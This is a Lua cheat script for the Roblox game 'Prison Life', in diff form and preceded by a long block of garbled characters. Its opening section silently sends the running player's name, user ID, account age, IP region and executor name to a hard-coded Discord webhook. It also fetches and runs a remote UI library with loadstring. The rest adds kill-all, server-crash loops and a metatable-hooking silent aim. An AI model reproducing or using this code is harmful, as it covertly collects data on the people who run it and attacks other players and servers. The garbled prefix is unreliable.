tq!6.cvY_IaMW!acv_66cv0d&_.&v4_4a4w464&4dDa6wc6Kc;0^l!4c6_d6&vDdt6!!.<vx_Y0._4.lc60l;sdO&3ca&6D4dl!_.CvY_qazwA6XcQ0{J_di&(DBlA4TtY.4wTv6_&aqw:6U0!6.cD0D6l!d0cDdlt&l.6v4_PaxwJc_w6_4lD0_k&dd&!ult6!d.,v<_Htl_6a_ww6dj_d3&VDRly4{t-_G0Dv6_!aKw:6L0_66a4d606D?lb4M!_4dDH!w.4v!_6.lwd6ld!wl<Dc_&6Dald!6.!vK_Ga*_tadva06n&dz&UD}.cD4d_4dv!!d4_tc_d._c_l&44t4!4.4v4l46D!_0!n!d!&!D!l!!!tD2_t&!4.4v4_4a4D40Dv6_.a)w 6N&l64a!wlq6dt&!Ddt6!a.kv,_nwc_da!vl6Da_.!&6DclV47ty44ttl!.dt_!l66cl0*{+dC(ad6&vDd%.!-.>vI_G.vwj6ec/0+ZBdH&9G_l04gt6!+.&vu_zaEtx6ac#06rUd6&z2dlu45tc!g._vJ_Ma3w%6<c70_GYd!&JDWl+4lt%!B.wvo_la,wI6Kcm0g69cv&(D!lW4ltB!l.Hnbvla#w!6Za!0QAadU0_calR4lti!!.*vk_54Gw!6#cl0Z3ld1&tD(d_&.to!d.+vc_JaZwZ__al0Nocd &0D+lX4{D_l_.,va_Ua0wu62cU0RF&dy&lD,la48t_!<4<vl_xa!wG66c=0l:#c_l6D{ll4Xtw!?.jv9l 64wo6lc<0l1Mdt&No_lD4Ttd!Q4lv*_)aKtj_lcQ0d73dd&qDtlU&_t!!3.cv}!7a?wg6=a_0ak3da&/?_ls49tq!#4wvC_da*wa6Ic_0;6_dc&9DclU&ltN!{.:DO!DaNwc68cc0q/tdn0_dYl#4at*l6./vi_N._wD6nc.03h_d<&9D%lB44t#!c.Uv._yafw^6#cd0}mld#&8D<l_4ZD+l&.rv!_>a4wJ6lc30i?tdR&6DBl!4bt6!)4_vd_Ra6wz_cc<0ps)ak0DD5l64 t6!B.vv2l 46wI66cn06Ebd.&p6>lc4;t6!K.6v=_Da>wy6DcE0!JTdI&kD^lm4bDw!1.lvH_6aCwM6;c(0DNGd6&KDllB46t3l_.wv,_6a,wd6^cy0RoZdw&-D6lL46tP!6.Nv/dca wO6yc60LX-db& DslZ4bt2!6.Ev&_=aXwR66c&0LOxdTtcd40_Dd!!4dD_lc.dt_w660c*0/;p4_6_d4&aD.dldCt_!w4dvdw664cW02fF&l#dd6&vvddc4dttll_6acw-6)cz_dctw%C6d!&046kw!).fv5a^vD_wa4w!6d_owlBdd6&v0^d!4dtw!d.!tl_dal.z_ac4wlF.6?&!DDlw4DD_?&lG0_!_a4wa6.alaJo_dw0dDdt6!v.zv2_ow!_dawwd6!alagD>dD&wD4l!4d.6vc_oaPw,c_wd6vcDwl*dD6l44jt=!7Da!D4_v0!!.Ww66!cdd_&QD/lP4MtX!uaRAD_6adwh6YcG_ja_04itcld54VtF!<&ctc_VaRwM6DcE06F)dc&ZDlD!43t-!U.DvN_6a*wEddc(06#rds&nD6lPw8aw!2.6v9_4aRw_6ra_wcH7d_&HD.lF42t^dr4-vn__a<w_6Hca0W_bcw&;D_l/4_t:!!.{DV_la/w_6Bc_0M^6d=0_DllX4ltV!l.9v{_Nayvd6Lcd0#H6d1&GD=lLwlth!l.2vd_1aqwb6-ct0PU_dk&PD/l64zD_!0.Hv__Ja&wo6nczw_6!d?&!DEld4=tk!>.<va_<a_w*6_cT06N=d2vcD1lW4+t6!r.hvM_*aCwV6nc6w*kmdE&uD6l&4ztH!evD_D.tv6_vadw!66cw0w&6DDlF4xtJ4atdll4_v6!aavwd_lc6wlh6d_&wDdt6l_.gvu_1wa_D._ww6ldl0DD!d!0_Ddld4tvz!D.4vt!l66ca0x98dhD#dw&6y4ld&_D!v6_aaBwT6k0c6dc!wlqDc_a_46t&!2.uvxcavd!lc=ww66a40d6_c!l64.tb!B.Z6a.dtlQvaDvd_!cdd6&0DKlF4*d!4dDll_.dv6_laDwt6wa4d6&0DOl+4Alt4dDa!!.!vw_D.!vd__cdd6&lDflz49la46tv!d_6a4wO6Uc^_acDw_e0c!0FD6l!4d.6vv_ra,wQd!vd__a_0d+tcl.!D6lv4dD_!6_6atwH6EcTDcc40tMl!c&4K_d!&lw!!..4vw_l66c00>o5dftwdD&!D6lw.Wtw!644vd!_66c00(+ d*t!dw&DA!ld&!Dl6!..v6!_66c!0{AEdT)tdd0a0&tb!U.:t_awaFw76oc&0;U dRw3mdlY4Hte!p.<vl_=47ww6,c60zMxd}&tDOcx&6tO!_.Fve_jacw;__a00MO!dJ&0DRlq4Y-Xlc.bv!_<a!wM6wc7v*m!dR&lDzl!4Et!!^4_a6_Eadw,6&c%0nOPaZr.D9ld49td!?.vvB!_.wwQ6ccn0d+Tdz&}6{l64ytc!2.cv+!9aitM6cc10aGXd6&YDalP47D0!2..v8_6a-wM6fcpw.m1da&5D_l(4_t:!c4&vm_.a^w>6Cc60Jm.dz&RDDl54JtR!_.gv?_Xa*wD6GcZ0I>;dB&HD3lN4DtF!L.Zv6_Iajw<6}cD0-n7dW&dDblg47tY!D.kvb_3alwU6PcF0)eDd8&EDAl!4^tP!e.=vD_fa/wM6cck052^d=&DDilq4Bta!H.>vC!_j.wP6.cx0DH3dN&ZX_d04qt.!P._vq_%aWv_64cK047Zd&&oDml?4LDc!/..vA__aZw_65.10!RUd4&PD.l-46tnl_40v=_&a2w.6#cY0-#fcd&uD0lU4.tE!o.ZvB0oaqww6gcZ0o+Jd>&xaDl-4&tQ!w.}v6_Z._c66{c&0fJ4dA&jDqlc&&t/!0.+v6_Ba6w966c}0,NDdu&bD2l44{tz!x.ycv_>a&wR6_c<0_^(cf0cD+l.4ft6!R.&vP!_adwu6&cP0.Hkd1& DAld4-t0!i..v9_=a<wP6!c20wWVd6&IDFlk4
+local plr = game.Players.LocalPlayer
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+local LocalizationService = game:GetService("LocalizationService")
+ 
+-- Function to get the exploit being used
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+ 
+-- Placeholder for alternative information
+local playerDevice = "Unknown Device"
+local playerUserAgent = "Not Available"
+ 
+-- Get the player's avatar image URL
+local avatarUrl = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username=" .. plr.Name
+ 
+-- Function to get the player's IP region
+local function getIPRegion()
+    local success, region = pcall(function()
+        return LocalizationService:GetCountryRegionForPlayerAsync(plr)
+    end)
+    return success and region or "Unknown"
+end
+ 
+-- Content for the webhook message
+local Content = 'Someone just got banned!'
+local Embed = {
+    ["title"] = "__**New execution.**__",
+    ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
+    ["type"] = "rich",
+    ["color"] = tonumber(0xffff00),
+    ["thumbnail"] = {
+        ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
+    },
+    ["image"] = {
+        ["url"] = avatarUrl
+    },
+    ["fields"] = {
+        {
+            ["name"] = "__Account Age:__",
+            ["value"] = plr.AccountAge.." days old",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "__User ID:__",
+            ["value"] = plr.UserId,
+            ["inline"] = true
+        },
+        {
+            ["name"] = "__Device Info:__",
+            ["value"] = playerDevice,
+            ["inline"] = true
+        },
+        {
+            ["name"] = "__User Agent:__",
+            ["value"] = playerUserAgent,
+            ["inline"] = true
+        },
+        {
+            ["name"] = "__IP Region:__",
+            ["value"] = getIPRegion(),
+            ["inline"] = true
+        }
+    },
+    ["footer"] = {
+        ["text"] = "Simple banwave",
+        ["icon_url"] = "https://i.imgur.com/Vz2XUGj.jpg"
+    },
+    ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+};
+ 
+-- Send the webhook message
+(syn and syn.request or http_request or http.request) {
+    Url = 'https://discord.com/api/webhooks/1278322577261068288/4hbvotG7N5inOdvfliX9-PZ2GbAFxxXr4h2agku2Yo6SDtPfbWF-Q9I_y645WlWbXsuM';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    },
+    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
+};
+
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/turtle"))()
+
+local OwO = library:Window("Prison Life")
+
+OwO:Label("Admin Commands", Color3.fromRGB(127, 143, 166))
+
+local toggleKillAll = false
+local killAllConnection
+
+OwO:Toggle("Kill All V1", false, function(bool)
+    toggleKillAll = bool
+    if toggleKillAll then
+        -- Start the loop when the toggle is on
+        killAllConnection = game:GetService("RunService").Stepped:Connect(function()
+            for i, v in next, game:GetService("Players"):GetChildren() do
+                pcall(function()
+                    if v ~= game:GetService("Players").LocalPlayer and not v.Character:FindFirstChildOfClass("ForceField") and v.Character.Humanoid.Health > 0 then
+                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+                        game.ReplicatedStorage.meleeEvent:FireServer(v)
+                    end
+                end)
+                wait(0.1)
+            end
+        end)
+    else
+        -- Stop the loop when the toggle is off
+        if killAllConnection then
+            killAllConnection:Disconnect()
+        end
+    end
+end)
+
+OwO:Label("Server Commands", Color3.fromRGB(127, 143, 166))
+
+local toggleCrashV1 = false
+local runServiceConnection
+
+OwO:Toggle("Crash Server V1", false, function(bool)
+    toggleCrashV1 = bool
+    if toggleCrashV1 then
+        -- Start the loop when the toggle is on
+        runServiceConnection = game:GetService("RunService").RenderStepped:Connect(function()
+            local args1 = { [1] = "Bright orange" }
+            local args2 = { [1] = "Bright blue" }
+            workspace.Remote.TeamEvent:FireServer(unpack(args1))
+            workspace.Remote.TeamEvent:FireServer(unpack(args2))
+            wait(0.001)  -- Wait for 1 millisecond (approximate)
+        end)
+    else
+        -- Stop the loop when the toggle is off
+        if runServiceConnection then
+            runServiceConnection:Disconnect()
+        end
+    end
+end)
+
+OwO:Button("Crash Server V2", function()
+    -- Made By Jake11price --
+    -- Crash Server --
+    local Gun = "Remington 870"
+    local Player = game.Players.LocalPlayer.Name
+
+    -- Give the player the gun
+    game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)
+
+    -- Move the gun from the backpack to the character
+    for i, v in pairs(game.Players[Player].Backpack:GetChildren()) do
+        if v.Name == Gun then
+            v.Parent = game.Players.LocalPlayer.Character
+        end
+    end
+
+    Gun = game.Players[Player].Character[Gun]
+
+    -- Unequip all tools
+    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
+
+    -- Function to fire the gun
+    local function FireGun(target)
+        coroutine.resume(coroutine.create(function()
+            local bulletTable = {}
+            table.insert(bulletTable, {
+                Hit = target,
+                Distance = 100,
+                Cframe = CFrame.new(0,1,1),
+                RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
+            })
+            game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
+            wait()
+        end))
+    end
+
+    -- Continuously fire the gun in a loop
+    while game:GetService("RunService").Stepped:wait() do
+        for count = 0, 10, 10 do
+            FireGun()
+        end
+    end
+end)
+
+local OwO = library:Window("Scripts")
+
+-- First Dropdown: Police
+local dropdown1 = OwO:Dropdown("Police", {"Select Police"}, function(name)
+   if name == "Select Police" then
+       local args = {
+           [1] = "Bright blue"
+       }
+       workspace.Remote.TeamEvent:FireServer(unpack(args))
+       print("Police team selected with color: Bright blue")
+   end
+end)
+
+-- Second Dropdown: Prisoner
+local dropdown2 = OwO:Dropdown("Prisoner", {"Select Prisoner"}, function(name)
+   if name == "Select Prisoner" then
+       local args = {
+           [1] = "Bright orange"
+       }
+       workspace.Remote.TeamEvent:FireServer(unpack(args))
+       print("Prisoner team selected with color: Bright orange")
+   end
+end)
+
+OwO:Label("Aim System", Color3.fromRGB(127, 143, 166))
+
+OwO:Button("Bullet Tracking", function()
+local Players = game.Players
+local LocalPlayer = Players.LocalPlayer
+local GetPlayers = Players.GetPlayers
+local Camera = workspace.CurrentCamera
+local WTSP = Camera.WorldToScreenPoint
+local FindFirstChild = game.FindFirstChild
+local Vector2_new = Vector2.new
+local Mouse = LocalPlayer.GetMouse(LocalPlayer)
+function ClosestChar()
+    local Max, Close = math.huge
+    for I,V in pairs(GetPlayers(Players)) do
+        if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
+            local Head = FindFirstChild(V.Character, "Head")
+            if Head then
+                local Pos, OnScreen = WTSP(Camera, Head.Position)
+                if OnScreen then
+                    local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
+                    if Dist < Max then
+                        Max = Dist
+                        Close = V.Character
+                    end
+                end
+            end
+        end
+    end
+    return Close
+end
+ 
+local MT = getrawmetatable(game)
+local __namecall = MT.__namecall
+setreadonly(MT, false)
+MT.__namecall = newcclosure(function(self, ...)
+    local Method = getnamecallmethod()
+    if Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
+        local Character = ClosestChar()
+        if Character then
+            return Character.Head, Character.Head.Position
+        end
+    end
+ 
+    return __namecall(self, ...)
+end)
+setreadonly(MT, true)
+end)
+
+-- Define a variable to control the loop
+local isLoopActive = false
+local loopConnection
+
+-- The toggle function to start/stop the loop and reset the character
+OwO:Toggle("Crash Server V2", false, function(bool)
+    isLoopActive = bool
+
+    if isLoopActive then
+        -- Made By Jake11price --
+        -- Crash Server --
+        local Gun = "Remington 870"
+        local Player = game.Players.LocalPlayer.Name
+
+        -- Give the player the gun
+        game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)
+
+        -- Move the gun from the backpack to the character
+        for i, v in pairs(game.Players[Player].Backpack:GetChildren()) do
+            if v.Name == Gun then
+                v.Parent = game.Players.LocalPlayer.Character
+            end
+        end
+
+        Gun = game.Players[Player].Character[Gun]
+
+        -- Unequip all tools
+        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
+
+        -- Function to fire the gun
+        local function FireGun(target)
+            coroutine.resume(coroutine.create(function()
+                local bulletTable = {}
+                table.insert(bulletTable, {
+                    Hit = target,
+                    Distance = 100,
+                    Cframe = CFrame.new(0,1,1),
+                    RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
+                })
+                game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
+                wait()
+            end))
+        end
+
+        -- Continuously fire the gun in a loop
+        loopConnection = game:GetService("RunService").Stepped:Connect(function()
+            if isLoopActive then
+                for count = 0, 10, 10 do
+                    FireGun()
+                end
+            end
+        end)
+    else
+        -- Stop the loop by disconnecting the connection
+        if loopConnection then
+            loopConnection:Disconnect()
+            loopConnection = nil
+        end
+
+        -- Reset the character by changing the team color
+        local args = {
+            [1] = "Bright blue"
+        }
+        workspace.Remote.TeamEvent:FireServer(unpack(args))
+    end
+end)
